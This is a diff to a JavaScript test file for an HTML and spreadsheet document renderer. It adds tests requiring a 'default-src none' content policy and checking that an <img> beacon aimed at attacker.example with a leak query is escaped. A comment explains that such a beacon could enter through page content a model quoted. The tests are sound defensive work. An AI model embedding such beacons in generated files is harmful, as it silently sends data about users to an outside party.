@@ -183,9 +183,28 @@ await test("html: markdown becomes a real page, and content is escaped rather th
   assert(hostileText.includes("&lt;script&gt;"), "the script text was not escaped");
 });
 
-await test("html: a run that deliberately writes a full document is stored as written", async () => {
+await test("html: a run that deliberately writes a full document keeps its markup but not the network", async () => {
   const buffer = await renderDocument("html", "<html><body><p>x</p></body></html>", { title: "t" });
-  assert(buffer.toString("utf8").startsWith("<html>"), "a deliberate full document was rewritten");
+  const text = buffer.toString("utf8");
+  assert(text.startsWith("<html>"), "a deliberate full document was rewritten");
+  assert(/Content-Security-Policy/i.test(text), "the passthrough document carries no policy");
+  assert(/default-src 'none'/.test(text), "the policy does not block every fetch");
+});
+
+await test("html: a beacon cannot ride along in a generated or passthrough document", async () => {
+  // The vector this closes: document content can come from page content a
+  // model quoted, and an <img> pointed at an attacker would fire the moment
+  // anyone opened the file. An iframe sandbox stops scripts, not the network.
+  const generated = (
+    await renderDocument("html", 'Xem <img src="https://attacker.example/?leak=1"> nhé', { title: "t" })
+  ).toString("utf8");
+  assert(/default-src 'none'/.test(generated), "the generated document carries no policy");
+  assert(!/<img src="https:\/\/attacker/.test(generated), "the img survived as live markup rather than escaped text");
+
+  const withHead = (await renderDocument("html", "<html><head><title>t</title></head><body>x</body></html>", {})).toString("utf8");
+  const cspIndex = withHead.search(/Content-Security-Policy/i);
+  assert(cspIndex > 0, "no policy injected into an existing head");
+  assert(cspIndex < withHead.indexOf("<body"), "the policy must precede the body it governs");
 });
 
 await test("xlsx: one worksheet per markdown table, numbers stay numeric", async () => {
